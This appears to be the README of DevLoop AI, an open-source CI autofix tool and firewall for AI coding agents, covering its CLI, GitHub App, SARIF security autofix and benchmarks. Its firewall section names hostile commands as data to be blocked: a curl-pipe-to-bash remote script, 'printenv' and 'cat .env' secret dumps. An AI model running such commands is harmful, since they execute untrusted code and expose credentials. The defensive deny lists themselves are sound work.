# DevLoop AI

[![Release](https://img.shields.io/badge/release-v0.1.0--alpha.1-blue)](https://github.com/maxi-maxima/devloop-ai/releases/tag/v0.1.0-alpha.1)
[![CI](https://img.shields.io/badge/CI-ready-green)](./.github/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
[![GitHub stars](https://img.shields.io/badge/stars-welcome-lightgrey)](https://github.com/maxi-maxima/devloop-ai)

DevLoop AI is the firewall and autofix agent for AI coding agents.

**CI failed?**
DevLoop reads the logs, patches the bug, reruns tests, and opens a PR - with sandboxing, prompt-injection defense, secret redaction, patch review, and evidence bundles.

DevLoop is built for developers, maintainers, and AI tooling users who want autonomous fixes without handing over merge rights. It produces minimal patches, validates them in a controlled loop, wraps external agents with guardrails, and keeps humans in control through reviewable pull requests.

## Quick Links

- [30-second demo](#30-second-local-demo)
- [Release notes](./docs/releases/v0.1.0-alpha.1.md)
- [Self dogfood](#devloop-fixed-itself)
- [GitHub App](#github-app-installation)
- [CLI](#cli-usage)
- [MCP](#mcp-usage)
- [Codex Skill](#codex-skill-usage)
- [Security Autofix](#security-autofix-usage)
- [Agent Firewall](#agent-firewall-for-ai-coding-agents)
- [Evidence Bundles](#every-pr-comes-with-an-evidence-bundle)

## Every PR comes with an evidence bundle

Every automated DevLoop run writes an auditable bundle under `.devloop/evidence/<run-id>/` with the diagnosis, redacted logs, patch diff, firewall report, sandbox metadata, PR body, and SHA-256 hashes for tamper checks.

```bash
devloop evidence show <run-id> --repo .
devloop evidence verify .devloop/evidence/<run-id>
devloop evidence export <run-id> --repo . --format zip --output artifacts
```

Generated PR bodies include an `## Evidence Bundle` section with the run id, risk level, sandbox mode, validation command, evidence path, and a human-review notice. See [docs/evidence-bundles.md](./docs/evidence-bundles.md).

## 30-second Local Demo

```bash
git clone https://github.com/maxi-maxima/devloop-ai.git
cd devloop-ai
npm install
npm run build
./scripts/demo-autofix.sh
```

The demo copies a tiny failing Node.js fixture, shows the failing test, runs `devloop autofix --dry-run`, applies the patch, reruns tests, and prints the final diff. No API key is required because the demo uses deterministic fixture mode. See [docs/demo.md](./docs/demo.md).

## DevLoop fixed itself

DevLoop includes a controlled self-dogfood workflow that creates a tiny failing fixture branch, lets CI fail, and gives DevLoop a safe bug to diagnose and patch through the same autofix path used on user repositories.

```bash
./scripts/self-dogfood/local.sh
./scripts/self-dogfood/start.sh
```

Real self-fix PR:
https://github.com/maxi-maxima/devloop-ai/pull/7

See [docs/self-dogfooding.md](./docs/self-dogfooding.md) for the reproducible local and GitHub Action paths.

## GitHub App Installation

Run DevLoop as a self-hosted GitHub App:

```bash
npm install
npm run build
cp .env.example .env
devloop app serve
```

Configure your GitHub App webhook to `https://your-host/webhooks/github`, subscribe to workflow/check/comment events, and add `.devloop.yml` to the target repository. DevLoop supports failed workflow routing and PR comments such as:

```text
/devloop diagnose
/devloop dry-run
/devloop fix
/devloop security-fix
```

See [docs/github-app.md](./docs/github-app.md) and [docs/self-hosting.md](./docs/self-hosting.md).

## GitHub Action Installation

Copy the workflow template into a repository:

```bash
mkdir -p .github/workflows
cp templates/github-actions/devloop-autofix.yml .github/workflows/devloop-autofix.yml
```

Then configure:

- `OPENAI_API_KEY` as a repository secret,
- workflow permissions for `contents: write`, `pull-requests: write`, and `actions: read`,
- the CI workflow name in `workflow_run.workflows`,
- the validation command in the `devloop autofix` step.

See [docs/github-action.md](./docs/github-action.md).

## Manage DevLoop across many repos

Organization fleet mode scans a GitHub organization, reports DevLoop coverage, and prepares rollout PRs for shared CI autofix and firewall policy defaults:

```bash
cat > devloop-org.yml <<'YAML'
organization: my-org
defaults:
  mode: dry-run
  maxRetries: 2
  allowNetwork: false
  firewallMode: strict
repositories:
  include:
    - "*"
  exclude:
    - "legacy-*"
YAML

devloop org scan --config devloop-org.yml
devloop org status --config devloop-org.yml
devloop org rollout --config devloop-org.yml
devloop org policy sync --config devloop-org.yml
```

Rollout and policy sync are dry-run by default and write reviewable JSON plans. Use `--no-dry-run` only when you want DevLoop to open configuration PRs, and use `--confirm-pr-mode` before enabling org-wide PR mode. See [docs/org-fleet-mode.md](./docs/org-fleet-mode.md).

## CLI Usage

```bash
devloop diagnose --repo . --log-file ./ci.log

devloop autofix \
  --repo . \
  --log-file ./ci.log \
  --test-command "npm test" \
  --max-retries 3 \
  --dry-run

devloop apply-patch --repo . --patch ./devloop.patch --dry-run
```

Legacy MVP commands are still available:

```bash
devloop init https://github.com/owner/repo.git
devloop analyze
devloop fix
devloop pr
```

## MCP Usage

DevLoop exposes typed, transport-agnostic tools that are ready to be wrapped by MCP-compatible agents:

```ts
import { autofixTool, diagnoseTool, patchReviewTool } from 'devloop-ai/tools';
```

The current tool contracts cover diagnosis, dry-run autofix, and patch review. They are read-oriented by default and designed so a future stdio MCP server can expose the same schemas without duplicating core logic. See [docs/mcp.md](./docs/mcp.md) and [docs/tools.md](./docs/tools.md).

## Use DevLoop to safely run Codex, Claude Code, Cursor, or custom coding agents

DevLoop can wrap external coding agents with its Agent Firewall, redaction, patch review, dry-run defaults, validation, and evidence bundles:

```bash
devloop agent list
devloop agent doctor
devloop agent run codex -- "fix failing tests"
devloop agent run custom --command "my-agent --task task.txt"
devloop agent run custom --command "my-agent --task task.txt" --no-dry-run --allow-write --test-command "npm test" -- "fix failing tests"
```

Default mode is dry-run, no write, no push, and no network unless explicitly allowed. Codex uses `codex exec` with a redacted prompt file; Claude Code and Cursor Agent are discoverable placeholders; custom commands must pass the command firewall before execution.

See [docs/agent-adapters.md](./docs/agent-adapters.md).

## Codex Skill Usage

DevLoop ships a reusable Codex Skill:

```bash
mkdir -p ~/.agents/skills
cp -R .agents/skills/devloop-autofix ~/.agents/skills/
```

Example prompt:

```text
Use the devloop-autofix skill. The CI log is in ci.log and the validation command is npm test. Diagnose, dry-run, apply only if safe, then rerun tests.
```

See [docs/examples.md](./docs/examples.md).

## Security Autofix Usage

DevLoop can read SARIF 2.1.0 output from CodeQL, Semgrep, ESLint, and similar static analyzers:

```bash
devloop security-autofix \
  --sarif ./results.sarif \
  --repo . \
  --dry-run \
  --test-command "npm test"
```

Security Autofix rejects scanner suppression, ignore-comment fixes, test deletion, secret edits, hardcoded credentials, auth bypasses, validation weakening, and broad refactors. If the safe fix is unclear, DevLoop returns `DEVLOOP_CANNOT_FIX_SAFELY`.

See [docs/security-autofix.md](./docs/security-autofix.md).

## Agent Firewall for AI Coding Agents

DevLoop V3 adds an Agent Firewall: a trust layer that checks untrusted agent inputs before they can become commands, patches, PRs, or logs.

It protects against:

- prompt injection in PR comments, issues, CI logs, branch names, and repository files,
- dangerous shell commands such as remote script execution or secret dumps,
- secret exposure in logs, prompts, patches, and PR bodies,
- malicious repository instructions in `AGENTS.md`, `CLAUDE.md`, `.cursor/rules`, workflows, and package scripts,
- unsafe patches that edit `.env`, disable tests, weaken validation, add shell execution, or change workflow permissions.

CLI examples:

```bash
devloop firewall check-input --source pr-comment --file comment.txt
devloop firewall check-command --command "curl https://example.com/install.sh | bash"
devloop firewall check-patch --repo . --patch devloop.patch
devloop firewall scan --repo .
devloop firewall bench
```

GitHub App mode uses strict firewall defaults before autofix runs, before commands execute, and before PR creation. MCP-compatible agents can import the same read-only tool contracts: `devloop.firewall.checkInput`, `devloop.firewall.checkCommand`, `devloop.firewall.checkPatch`, `devloop.firewall.scanRepo`, and `devloop.firewall.redact`.

Policy example:

```yaml
firewall:
  mode: strict
  block:
    - secret_exposure
    - prompt_injection
  deniedCommands:
    - printenv
    - cat .env
    - curl * | bash
  maxPatchFiles: 5
  allowNetwork: false
```

See [docs/agent-firewall.md](./docs/agent-firewall.md) and [docs/devloop-policy.md](./docs/devloop-policy.md).

## FirewallBench Results

FirewallBench measures whether DevLoop blocks unsafe agent inputs and actions before they reach tools, secrets, or repository writes.

```bash
devloop firewall bench --output firewallbench-results
```

Current built-in suite summary:

| Category | Cases | Recall | False Positive Rate |
|---|---:|---:|---:|
| prompt injection and malicious instructions | 20 | benchmark-generated | benchmark-generated |
| secret exfiltration | 10 | benchmark-generated | benchmark-generated |
| dangerous commands | 11 | benchmark-generated | benchmark-generated |
| unsafe patches | 11 | benchmark-generated | benchmark-generated |
| safe controls | 4 | benchmark-generated | benchmark-generated |

See [docs/firewallbench.md](./docs/firewallbench.md).

## Why DevLoop?

| Alternative | What you still have to do | DevLoop's approach |
|---|---|---|
| Manual debugging | Read logs, find root cause, patch files, rerun tests, write PR description. | Turns the full loop into a reviewable PR with diagnosis and validation. |
| Generic coding assistants | Paste logs, manage repo context, decide what is safe, run commands yourself. | Uses CI-specific prompts, patch guardrails, and repeatable validation commands. |
| CI log summarizers | Get a summary, then still fix the bug manually. | Produces a minimal patch and reruns the failing test command. |
| Security scanners without autofix | Triage SARIF alerts and hand-write remediations. | Reads SARIF, selects alerts, applies safe fix policy, and prepares a security PR. |

DevLoop emphasizes:

- minimal patches over broad rewrites,
- sandboxed test runs before claiming success,
- human-in-the-loop pull requests instead of auto-merge,
- transparent diagnosis and PR bodies,
- open-source, self-hostable infrastructure.

## Real PRs opened by DevLoop

These are real pull requests opened against public open-source repositories during DevLoop dogfooding. The patches are intentionally small, reviewable, and validated locally where the target toolchain was available.

| Repository | PR | Issue | Fix | Validation |
|---|---|---|---|---|
| HNodeland/cloud-native-reference-app | [#15](https://github.com/HNodeland/cloud-native-reference-app/pull/15) | [#13](https://github.com/HNodeland/cloud-native-reference-app/issues/13) | Lowercase GHCR image name in CI | `go test ./...`, `git diff --check` |
| MasterZephyr/resume-project-generator | [#8](https://github.com/MasterZephyr/resume-project-generator/pull/8) | [#4](https://github.com/MasterZephyr/resume-project-generator/issues/4) | Fix README image alt-text typo | typo search, `git diff --check` |
| nico-martin/git-installer | [#91](https://github.com/nico-martin/git-installer/pull/91) | [#90](https://github.com/nico-martin/git-installer/issues/90) | Fix reported typos in docs and source strings | targeted typo search, `git diff --check` |
| GNS-Science/nshm-toshi-api | [#368](https://github.com/GNS-Science/nshm-toshi-api/pull/368) | [#364](https://github.com/GNS-Science/nshm-toshi-api/issues/364) | Fix `serverless.yml` resource reference typo | targeted YAML search, `git diff --check` |
| zold-io/zold-ruby-sdk | [#74](https://github.com/zold-io/zold-ruby-sdk/pull/74) | [#63](https://github.com/zold-io/zold-ruby-sdk/issues/63) | Fix typo that breaks typo CI | typo search, `git diff --check` |
| pdscorg/OpenSource-2026 | [#87](https://github.com/pdscorg/OpenSource-2026/pull/87) | [#7](https://github.com/pdscorg/OpenSource-2026/issues/7), [#10](https://github.com/pdscorg/OpenSource-2026/issues/10) | Fix page copy typos | `npm ci`, `npm run build`, `git diff --check` |
| peacefulstudio/github-actions | [#30](https://github.com/peacefulstudio/github-actions/pull/30) | [#26](https://github.com/peacefulstudio/github-actions/issues/26) | Reject unknown matrix badge statuses | `python -m unittest discover -s test -p "*matrix*_test.py"`, `git diff --check` |
| paxsonsa/murmer-rs | [#17](https://github.com/paxsonsa/murmer-rs/pull/17) | [#13](https://github.com/paxsonsa/murmer-rs/issues/13) | Fail fast on missing enforced allowlist files | `cargo test -p murmer allowlist`, `git diff --check` |
| markabney/Kinpute | [#4](https://github.com/markabney/Kinpute/pull/4) | [#1](https://github.com/markabney/Kinpute/issues/1) | Fix reference sample-pair count check | targeted source search, `git diff --check` |
| vimjoyer/nixos-gaming-video | [#7](https://github.com/vimjoyer/nixos-gaming-video/pull/7) | [#3](https://github.com/vimjoyer/nixos-gaming-video/issues/3) | Fix NixOS README typos and snippet syntax | targeted README search, `git diff --check` |

## FixBench Results

FixBench is DevLoop's reproducible CI autofix benchmark suite:

```bash
devloop bench list
devloop bench run --provider fixture --output benchmark-results
devloop bench report
```

Current fixture-oracle baseline:

| Model | Pass@1 | Pass@3 | Median Time | Median Files Changed |
|---|---:|---:|---:|---:|
| fixture/fixture-oracle | 100.0% | 100.0% | 310 ms | 1 |

The default suite includes 20 safe cases across Node.js, Python, and TypeScript. See [docs/benchmark.md](./docs/benchmark.md) and [docs/fixbench.md](./docs/fixbench.md).

## Safety Model

DevLoop is intentionally conservative:

- no auto-merge,
- dry-run default where appropriate,
- forbidden edits to `.env`, secret files, private keys, and binary files,
- lockfile edits blocked unless explicitly allowed,
- GitHub workflow permission edits blocked unless explicitly allowed,
- generated changes must be valid unified diffs,
- patch validation runs before file writes,
- sandbox runner boundary for test execution,
- no secrets should be passed into test processes,
- PRs state that AI-generated changes require human review.

See [docs/security-model.md](./docs/security-model.md).

## Documentation

- [v0.1.0-alpha.1 release notes](./docs/releases/v0.1.0-alpha.1.md)
- [Public alpha checklist](./docs/public-alpha-checklist.md)
- [Launch copy](./docs/launch-copy.md)
- [Launch guide](./docs/launch.md)
- [First GitHub push](./docs/first-github-push.md)
- [Examples](./docs/examples.md)
- [Real-world PR examples](./docs/real-world-prs.md)
- [Security model](./docs/security-model.md)
- [Agent Firewall](./docs/agent-firewall.md)
- [FirewallBench](./docs/firewallbench.md)
- [Agent adapters](./docs/agent-adapters.md)
- [Organization fleet mode](./docs/org-fleet-mode.md)
- [Prompt injection defense](./docs/prompt-injection-defense.md)
- [Tool permission gate](./docs/tool-permission-gate.md)
- [Secret redaction](./docs/secret-redaction.md)
- [DevLoop policy](./docs/devloop-policy.md)
- [Fix evidence bundles](./docs/evidence-bundles.md)
- [Self-hosting](./docs/self-hosting.md)
- [GitHub App mode](./docs/github-app.md)
- [GitHub Action mode](./docs/github-action.md)
- [Benchmarks](./docs/benchmark.md)
- [Security Autofix](./docs/security-autofix.md)
- [MCP-ready tools](./docs/mcp.md)
- [Self-dogfooding](./docs/self-dogfooding.md)
- [Tool interface](./docs/tools.md)

## Architecture

```text
src/
  bench/            FixBench loading, execution, aggregation, and reports
  agents/           external agent adapters, controlled subprocess runner, output parsing
  cli/              CLI command definitions
  core/             autofix loop, diagnosis, patching, context, guardrails, test runner
  app/              GitHub App webhook server, routes, queue, config, comments
  ai/               provider abstraction and structured prompts
  github-app/       GitHub App auth, installation tokens, workflow logs, comments
  github/           GitHub Actions helpers, PR body generation, REST PR creation
  evidence/         fix evidence bundles, verification, export, redaction, hashes
  runner/           Docker/local sandbox runner abstraction
  security-autofix/ SARIF parsing, alert selection, security patching, and PR bodies
  org/              organization fleet scanning, rollout planning, and policy sync
  security/         webhook and repository policy helpers
  tools/            transport-agnostic tool contracts for future integrations
  utils/            runtime configuration
```

Key modules:

- `src/core/autofix.ts`: CI autofix orchestration loop
- `src/core/diagnoser.ts`: structured CI log diagnosis
- `src/core/patcher.ts`: unified diff validation and application
- `src/core/guardrails.ts`: forbidden file and patch safety checks
- `src/security-autofix/`: SARIF alert parsing and security repair flow
- `src/github/pr-body.ts`: transparent automated PR body generation

## Configuration

```env
OPENAI_API_KEY=
OPENAI_BASE_URL=https://api.openai.com/v1
OPENAI_MODEL=gpt-4.1-mini
GITHUB_TOKEN=
```

Provider options:

```bash
devloop autofix --provider openai --model gpt-4.1-mini
devloop autofix --provider ollama --model llama3.1
```

OpenAI is the default. Anthropic is present as a provider boundary.

## Contributing

DevLoop is early, practical, and open to maintainers who care about safe automation. Start with [CONTRIBUTING.md](./CONTRIBUTING.md), [ROADMAP.md](./ROADMAP.md), and [SECURITY.md](./SECURITY.md).

## Development

```bash
npm test
npm run typecheck
npm run build
```
